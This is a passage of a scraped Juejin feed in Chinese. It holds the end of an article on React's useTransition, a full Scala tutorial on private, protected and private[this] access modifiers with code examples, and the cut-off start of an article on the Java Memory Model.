<li>点击 Tab 切换大页面：用 useTransition</li>
<li>渲染大列表：都能用，但一般 prefer Transition</li>
</ul>
<hr/>
<h2 data-id="heading-21">💥 第八章：你见过最直观的示例：没有 useTransition vs 有 useTransition</h2>
<h3 data-id="heading-22">🎮 没用 useTransition</h3>
<p>你快速打字：</p>
<ul>
<li>输入框卡卡卡</li>
<li>CPU 占满</li>
<li>输入光标跳动卡顿</li>
</ul>
<h3 data-id="heading-23">🎠 用了 useTransition</h3>
<p>你快速打字：</p>
<ul>
<li>输入框始终流畅</li>
<li>列表稍后加载</li>
<li>UI 完全不卡</li>
</ul>
<p>这就是 <strong>优先级调度</strong> 的威力。</p>
<hr/>
<h2 data-id="heading-24">🎯 第九章：useTransition 的最佳实践（大厂常用写法）</h2>
<h4 data-id="heading-25">✔ 输入框里永远只放紧急更新</h4>
<h4 data-id="heading-26">✔ 大计算/大渲染一定放 transition</h4>
<h4 data-id="heading-27">✔ isPending 做 loading 占位</h4>
<h4 data-id="heading-28">✔ 列表多时，可搭配虚拟列表（react-window）</h4>
<h4 data-id="heading-29">✔ 不要过度使用，否则 UI 不同步反而奇怪</h4>
<hr/>
<h2 data-id="heading-30">🏁 结尾总结（最面试的那一句）</h2>
<p>如果面试官问你：</p>
<blockquote>
<p>React18 的 useTransition 有什么作用？</p>
</blockquote>
<p>你可以这样答：</p>
<blockquote>
<p><strong>它提供了一种把“不紧急渲染”放到低优先级执行的方式，依赖 React18 的并发特性和可中断渲染机制，通过 startTransition 包裹的更新可以被紧急任务打断，从而保证用户交互（如输入、点击）保持流畅。</strong></p>
</blockquote>
<p>一句话：</p>
<blockquote>
<p>useTransition 能让 UI 保持流畅，是因为 React18 引入了并发更新机制，允许状态更新根据优先级调度。被 startTransition 包裹的更新属于低优先级，渲染可以被中断、丢弃或延后执行，从而不阻塞高优先级的用户输入等交互任务。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Scala 访问权限详解：private、protected 与 private]]></title>    <link>https://juejin.cn/post/7575533124877762587</link>    <guid>https://juejin.cn/post/7575533124877762587</guid>    <pubDate>2025-11-24T02:05:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575533124877762587" data-draft-id="7575412016405479434" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Scala 访问权限详解：private、protected 与 private"/> <meta itemprop="keywords" content="Scala,后端,编程语言"/> <meta itemprop="datePublished" content="2025-11-24T02:05:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="今天没有盐"/> <meta itemprop="url" content="https://juejin.cn/user/1408937846645355"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Scala 访问权限详解：private、protected 与 private
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1408937846645355/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    今天没有盐
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T02:05:25.000Z" title="Mon Nov 24 2025 02:05:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">导入</h2>
<p>在 Scala 面向对象编程中，访问权限控制是封装性的重要体现。通过合理的访问权限设置，可以保护类的内部状态，提高代码的安全性和可维护性。本文将详细讲解 Scala 中的三种主要访问权限：private、protected 和 private[this]，并通过具体代码示例展示它们的使用场景和区别。</p>
<h2 data-id="heading-1">一、private 访问权限</h2>
<h3 data-id="heading-2">定义</h3>
<p>private 是 Scala 中最严格的访问权限修饰符，用于限制成员只能在特定范围内访问。</p>
<h3 data-id="heading-3">语法特点</h3>
<ul>
<li>在类的内部可以访问</li>
<li>在类的外部不能访问</li>
<li>在伴生对象中可以访问</li>
</ul>
<h3 data-id="heading-4">示例：private 基本使用</h3>
<h4 data-id="heading-5">代码</h4>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> level02

<span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">base3101</span> </span>{

  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span>(<span class="hljs-params">var name: <span class="hljs-type">String</span>, private var age: <span class="hljs-type">Int</span></span>) </span>{
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">say</span></span>(): <span class="hljs-type">Unit</span> = {
      println(<span class="hljs-string">s"<span class="hljs-subst">${this.age}</span>"</span>) <span class="hljs-comment">//（1）在类的内部可以访问。</span>
    }
  }

  <span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">Student</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span></span>(student: <span class="hljs-type">Student</span>): <span class="hljs-type">Unit</span> = {
      println(student.age) <span class="hljs-comment">//（3）在伴生对象中可以访问。</span>
    }
  }

  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span></span>(args: <span class="hljs-type">Array</span>[<span class="hljs-type">String</span>]): <span class="hljs-type">Unit</span> = {
    <span class="hljs-keyword">val</span> s1 = <span class="hljs-keyword">new</span> <span class="hljs-type">Student</span>(<span class="hljs-string">"小花"</span>, <span class="hljs-number">18</span>)
    s1.say()
    <span class="hljs-comment">// println(s1.age) // 报错。（2）在类的外部不能访问。</span>
    <span class="hljs-type">Student</span>.test(s1)
  }
}
</code></pre>
<h4 data-id="heading-6">结果展示</h4>
<pre><code class="hljs">18
18
</code></pre>
<h4 data-id="heading-7">代码分析</h4>
<ul>
<li>在 <code>Student</code> 类的 <code>say</code> 方法中，可以直接访问 <code>private var age</code>，体现了"在类的内部可以访问"</li>
<li>在 <code>main</code> 方法中，注释掉的 <code>println(s1.age)</code> 会编译报错，体现了"在类的外部不能访问"</li>
<li>在伴生对象 <code>Student</code> 的 <code>test</code> 方法中，可以访问 <code>student.age</code>，体现了"在伴生对象中可以访问"</li>
</ul>
<h2 data-id="heading-8">二、protected 访问权限</h2>
<h3 data-id="heading-9">定义</h3>
<p>protected 访问权限比 private 稍宽松，除了具备 private 的访问特性外，还允许在子类中访问。</p>
<h3 data-id="heading-10">语法特点</h3>
<ul>
<li>在类的内部可以访问</li>
<li>在类的外部不能访问</li>
<li>在伴生对象中可以访问</li>
<li>在子类中可以访问（与 private 的主要区别）</li>
</ul>
<h3 data-id="heading-11">示例：protected 与继承</h3>
<h4 data-id="heading-12">代码</h4>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> level02

<span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">base3102</span> </span>{

  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span>(<span class="hljs-params">var name: <span class="hljs-type">String</span>, private var age: <span class="hljs-type">Int</span>, protected var weight: <span class="hljs-type">Int</span></span>) </span>{
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">say</span></span>(): <span class="hljs-type">Unit</span> = {
      println(<span class="hljs-string">s"<span class="hljs-subst">${this.age}</span>, <span class="hljs-subst">${this.weight}</span>"</span>) <span class="hljs-comment">//（1）在类的内部可以访问。</span>
    }

    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sayAge</span></span>():<span class="hljs-type">Unit</span> = {println(age)}

    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sayWeight</span></span>():<span class="hljs-type">Unit</span> = { println(weight) }
  }
  
  <span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">Student</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span></span>(student: <span class="hljs-type">Student</span>): <span class="hljs-type">Unit</span> = {
      println(student.weight) <span class="hljs-comment">//（3）在伴生对象中可以访问。</span>
    }
  }

  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Major</span>(<span class="hljs-params">name: <span class="hljs-type">String</span>, age: <span class="hljs-type">Int</span>, weight: <span class="hljs-type">Int</span></span>) <span class="hljs-keyword">extends</span> <span class="hljs-title">Student</span>(<span class="hljs-params">name, age, weight</span>) </span>{
    <span class="hljs-comment">// 在子类中通过 super来访问父类</span>
    <span class="hljs-comment">// sayAge()  // 报错（4）private修饰的，在子类中无法访问。</span>
    sayWeight() <span class="hljs-comment">// 正常（4）protected修饰的，在子类中可以访问。</span>
  }

  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span></span>(args: <span class="hljs-type">Array</span>[<span class="hljs-type">String</span>]): <span class="hljs-type">Unit</span> = {
    <span class="hljs-keyword">val</span> s1 = <span class="hljs-keyword">new</span> <span class="hljs-type">Student</span>(<span class="hljs-string">"小花"</span>, <span class="hljs-number">18</span>, <span class="hljs-number">100</span>)
    s1.say()
    <span class="hljs-comment">// println(s1.weight) // 报错。（2）在类的外部不能访问。</span>
    <span class="hljs-type">Student</span>.test(s1)
  }
}
</code></pre>
<h4 data-id="heading-13">结果展示</h4>
<pre><code class="hljs">18, 100
100
</code></pre>
<h4 data-id="heading-14">代码分析</h4>
<ul>
<li><code>Student</code> 类中有 private 的 <code>age</code>、protected 的 <code>weight</code> 和 <code>sayWeight</code> 方法</li>
<li>在 <code>Major</code> 子类中，<code>sayAge()</code> 调用会报错，因为 private 成员在子类中不可访问</li>
<li><code>sayWeight()</code> 调用正常执行，因为 protected 成员在子类中可以访问</li>
<li>在 <code>main</code> 方法中直接访问 <code>s1.weight</code> 会报错，体现了 protected 成员在类外部不可访问</li>
</ul>
<h2 data-id="heading-15">三、private[this] 访问权限</h2>
<h3 data-id="heading-16">定义</h3>
<p>private[this] 是 Scala 中最严格的访问权限，限制了成员只能在当前对象实例中访问。</p>
<h3 data-id="heading-17">语法特点</h3>
<ul>
<li>在类的内部可以访问</li>
<li>在类的外部不能访问</li>
<li>在伴生对象中不能访问</li>
<li>在子类中不能访问</li>
</ul>
<h3 data-id="heading-18">示例：private[this] 的严格限制</h3>
<h4 data-id="heading-19">代码</h4>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> level02

<span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">base3103</span> </span>{

  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span>(<span class="hljs-params">var name: <span class="hljs-type">String</span>, private var age: <span class="hljs-type">Int</span>, protected var weight: <span class="hljs-type">Int</span></span>) </span>{
    <span class="hljs-keyword">private</span>[<span class="hljs-keyword">this</span>] <span class="hljs-keyword">var</span> pwd = <span class="hljs-number">123</span> <span class="hljs-comment">// 密码</span>
  }

  <span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">Student</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span></span>(student: <span class="hljs-type">Student</span>): <span class="hljs-type">Unit</span> = {
      println(student.age)     <span class="hljs-comment">// 普通的private在伴生对象中可以访问</span>
      <span class="hljs-comment">// println(student.pwd) 报错 （3）在伴生对象中，不能访问private[this]</span>
    }
  }

  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span></span>(args: <span class="hljs-type">Array</span>[<span class="hljs-type">String</span>]): <span class="hljs-type">Unit</span> = {
    <span class="hljs-keyword">val</span> s1 = <span class="hljs-keyword">new</span> <span class="hljs-type">Student</span>(<span class="hljs-string">"小花"</span>, <span class="hljs-number">18</span>, <span class="hljs-number">100</span>)
    <span class="hljs-type">Student</span>.test(s1)
  }
}
</code></pre>
<h4 data-id="heading-20">结果展示</h4>
<pre><code class="hljs">18
</code></pre>
<h4 data-id="heading-21">代码分析</h4>
<ul>
<li><code>pwd</code> 字段使用 <code>private[this]</code> 修饰，只能在当前对象实例中访问</li>
<li>在伴生对象 <code>Student</code> 的 <code>test</code> 方法中，可以访问普通的 <code>private var age</code></li>
<li>但访问 <code>student.pwd</code> 会编译报错，体现了 <code>private[this]</code> 在伴生对象中也不可访问</li>
</ul>
<h2 data-id="heading-22">四、案例</h2>
<h3 data-id="heading-23">示例：使用 private[this] 保护账户余额</h3>
<h4 data-id="heading-24">代码</h4>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> level02

<span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">class18</span> </span>{

  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bank</span>(<span class="hljs-params">private[this] var balance: <span class="hljs-type">Double</span></span>) </span>{
    <span class="hljs-comment">// 存钱</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deposit</span></span>(amount: <span class="hljs-type">Double</span>): <span class="hljs-type">Unit</span> = {
      balance += amount
    }
    <span class="hljs-comment">// 取</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">withdraw</span></span>(amount: <span class="hljs-type">Double</span>): <span class="hljs-type">Unit</span> = {
      <span class="hljs-keyword">if</span> (balance &gt;= amount) {
        balance -= amount
      }
    }

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getBalance</span></span>(): <span class="hljs-type">Double</span> = balance
  }

  <span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">Bank</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clear</span></span>(bank: <span class="hljs-type">Bank</span>): <span class="hljs-type">Unit</span> = {
      <span class="hljs-comment">// bank.balance = 0 // 在第11行，添加了private[this] 之后，就不能再直接访问balance属性</span>
    }
  }

  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span></span>(args: <span class="hljs-type">Array</span>[<span class="hljs-type">String</span>]): <span class="hljs-type">Unit</span> = {
    <span class="hljs-keyword">val</span> bank = <span class="hljs-keyword">new</span> <span class="hljs-type">Bank</span>(<span class="hljs-number">100</span>)

    bank.deposit(<span class="hljs-number">1000</span>)
    bank.withdraw(<span class="hljs-number">200</span>)

    <span class="hljs-type">Bank</span>.clear(bank)
    println(bank.getBalance())
  }
}
</code></pre>
<h4 data-id="heading-25">结果展示</h4>
<pre><code class="hljs">900
</code></pre>
<h4 data-id="heading-26">代码分析*</h4>
<ul>
<li><code>Bank</code> 类的 <code>balance</code> 使用 <code>private[this]</code> 修饰，确保余额只能在当前对象实例中访问</li>
<li>通过公共方法 <code>deposit</code>、<code>withdraw</code> 和 <code>getBalance</code> 来安全地操作和查询余额</li>
<li>在伴生对象 <code>Bank</code> 的 <code>clear</code> 方法中，直接设置 <code>bank.balance = 0</code> 会编译报错</li>
<li>这种设计确保了账户余额的安全性，防止外部直接修改</li>
</ul>
<h2 data-id="heading-27">总结</h2>
<p>Scala 提供了多层次的访问权限控制，从宽松到严格依次为：</p>
<ol>
<li><strong>protected</strong> - 允许类内部、伴生对象和子类访问</li>
<li><strong>private</strong> - 允许类内部和伴生对象访问</li>
<li><strong>private[this]</strong> - 只允许当前对象实例访问</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[什么是 Java 内存模型（JMM）？]]></title>    <link>https://juejin.cn/post/7575651989986000950</link>    <guid>https://juejin.cn/post/7575651989986000950</guid>    <pubDate>2025-11-24T03:10:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575651989986000950" data-draft-id="7575937594350223403" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="什么是 Java 内存模型（JMM）？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-24T03:10:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户34584828505"/> <meta itemprop="url" content="https://juejin.cn/user/3710177917545754"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            什么是 Java 内存模型（JMM）？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3710177917545754/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户34584828505
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:10:55.000Z" title="Mon Nov 24 2025 03:10:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Java 内存模型（JMM）定义了线程如何通过内存进行交互，规定所有变量存储在主内存，线程操作需将变量加载到工作内存，修改后写回主内存。核心是解决多线程并发时的原子性、可见性和有序性问题，通过 ​<code>​volatile​</code>​​、​<code>​synchronized​</code>​​ 等关键字和 ​<code>​final​</code>​ 保证线程安全。</p>
<h4 data-id="heading-0">一、JMM 的核心目标</h4>
<p>JMM 的核心目标是 <strong>定义程序中变量的访问规则</strong>，解决多线程并发时的三大核心问题：</p>
<ol>
<li><strong>原子性</strong><br/>
指一个操作是不可分割的整体，要么全部执行，要么全部不执行。</li>
</ol>
<ul>
<li>例：​<code>​i++​</code>​ 并非原子操作（实际包含读取、加 1、写回三步），多线程下可能出现数据丢失。</li>
<li>保证方式：​<code>​synchronized​</code>​、​<code>​Lock​</code>​、​<code>​java.util.concurrent.atomic​</code>​ 原子类。</li>
</ul>
<ol start="2">
<li><strong>可见性</strong><br/>
指一个线程修改的变量值，能被其他线程立即感知到。</li>
</ol>
<ul>
<li>原因：线程操作变量时，会先将主内存的变量加载到自己的 <strong>工作内存</strong>（CPU 缓存），修改后仅更新工作内存，未及时写回主内存，导致其他线程读取到旧值。</li>
<li>保证方式：​<code>​volatile​</code>​（强制写回主内存并 invalidate 其他线程的缓存）、​<code>​synchronized​</code>​、​<code>​final​</code>​。</li>
</ul>
<ol start="3">
<li><strong>有序性</strong><br/>
